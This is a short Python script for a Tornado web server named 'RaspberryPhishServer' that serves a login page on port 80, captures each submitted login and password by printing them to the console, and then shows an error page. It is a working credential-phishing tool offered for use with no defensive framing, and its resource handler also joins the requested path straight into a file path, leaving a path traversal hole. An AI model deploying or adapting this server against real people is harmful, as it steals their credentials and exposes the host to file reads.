#!/usr/bin/env python
# -*- coding: utf-8 -*-

__title__ = "RaspberryPhishServer"

pagePath = "test/"

import tornado.ioloop
import tornado.web


# Handler for ressources
class RscHandler(tornado.web.RequestHandler):
    def get(self, path_request):
        self.write(open("rsc/" + pagePath + path_request, 'rb').read())


# Handler for HTML files
class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.render("pages/" + pagePath + "index.html")

    def post(self):
        # @TODO work with ids
        print("login > " + self.get_body_argument("login"))
        print("password > " + self.get_body_argument("password"))
        # @TODO reload the same page or an error one or something else ...
        self.render("pages/" + pagePath + "error.html")


if __name__ == "__main__":
    # create an instance
    application = tornado.web.Application(
        [
            (r'/rsc/(.*)$', RscHandler),
            (r"/", MainHandler),
        ],
        autoreload=True, debug=True
    )

    # bind a port
    application.listen(80)

    # loop forever for satisfy user's requests
    tornado.ioloop.IOLoop.instance().start()
